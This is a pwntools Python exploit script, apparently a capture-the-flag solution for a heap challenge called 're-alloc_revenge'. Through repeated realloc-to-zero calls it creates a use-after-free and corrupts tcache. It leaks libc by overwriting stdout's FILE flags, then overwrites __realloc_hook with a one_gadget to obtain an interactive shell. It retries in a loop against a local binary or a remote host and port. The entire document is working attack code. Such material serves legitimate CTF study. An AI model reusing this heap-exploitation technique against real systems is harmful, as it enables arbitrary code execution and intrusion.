#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64", log_level="debug")
localfile = "./re-alloc_revenge"
locallibc = "./libc.so.6"
pf      = lambda name,num           :log.info(name + ": 0x%x" % num)
g       = lambda x                  :next(libc.search(asm(x)))

def allocate(idx, size, data):
    io.recvuntil("Your choice:")
    io.sendline("1")
    io.recvuntil("Index:")
    io.sendline(str(idx))
    io.recvuntil("Size:")
    io.sendline(str(size))
    io.recvuntil("Data:")
    io.send(data)

def realloc(idx, size, data):
    io.recvuntil("Your choice:")
    io.sendline("2")
    io.recvuntil("Index:")
    io.sendline(str(idx))
    io.recvuntil("Size:")
    io.sendline(str(size))
    if size != 0:
        io.recvuntil("Data:")
        io.send(data)

def free(idx):
    io.recvuntil("Your choice:")
    io.sendline("3")
    io.recvuntil("Index:")
    io.sendline(str(idx))

def exp():
    one_gadget = 0x106ef8

    allocate(0, 0x48, "A")
    free(0)

    allocate(0, 0x68, "A")
    realloc(0, 0, "")
    realloc(0, 0x18, "A")
    free(0)

    allocate(0, 0x48, "B")
    realloc(0, 0, "")
    realloc(0, 0x48, "B"*0x10)
    free(0)

    allocate(0, 0x48, "C")
    allocate(1, 0x68, b"C"*0x18+p64(0x451))
    free(1)

    for i in range(9):
        allocate(1, 0x58, "D")
        realloc(1, 0x78, "D")
        free(1)
    
    # 0x60 count++
    allocate(1, 0x58, "A")
    free(1)

    realloc(0, 0, "")
    realloc(0, 0x38, b"\x60\xa7")
    # gdb.attach(io, """b menu
    # b read_input
    # """)
    allocate(1, 0x48, "E")
    realloc(1, 0x18, "E")
    free(1)
    realloc(0, 0x18, "E"*0x10)
    free(0)

    # gdb.attach(io, "b menu")

    allocate(0, 0x48, p64(0xfbad1800)+p64(0)*2+b"leak:".rjust(8, b"\x00"))

    if len(io.recvuntil("leak:", timeout=1)) == 0:
        log.debug("failed")
        return
    libc_base = u64(io.recv(8)) - 0x1E5700
    pf("libc_base", libc_base)

    # gdb.attach(io, "b menu")

    allocate(1, 0x78, "F")
    realloc(1, 0, "")
    realloc(1, 0x18, "F"*0x10)
    free(1)
    # gdb.attach(io, "b menu")
    allocate(1, 0x78, b"F"*0x18+p64(0x61)+p64(libc_base+libc.sym["__realloc_hook"]))
    free(1)

    allocate(1, 0x58, "G")
    realloc(1, 0x28, "G")
    free(1)

    # gdb.attach(io, "b realloc")
    # allocate(1, 0x58, p64(libc_base+libc.sym["malloc"])+p64(libc_base+one_gadget))
    allocate(1, 0x58, p64(libc_base+one_gadget))

    io.recvuntil("Your choice: ")
    io.sendline("2")
    io.recvuntil("Index:")
    io.sendline("1")
    io.recvuntil("Size:")
    io.sendline(str(0x58))
    
    io.interactive()

elf = ELF(localfile)
libc = ELF(locallibc)

while True:
# if True:
    try:
        print("----------------------------------------------------------")
        argc = len(sys.argv)
        if argc == 1:
            # io = process(localfile, aslr=False)
            io = process(localfile)
        else:
            if argc == 2:
                host, port = sys.argv[1].split(":")
            elif argc == 3:
                host = sys.argv[1]
                port = sys.argv[2]
            io = remote(host, port)

        exp()
    except:
        io.close()
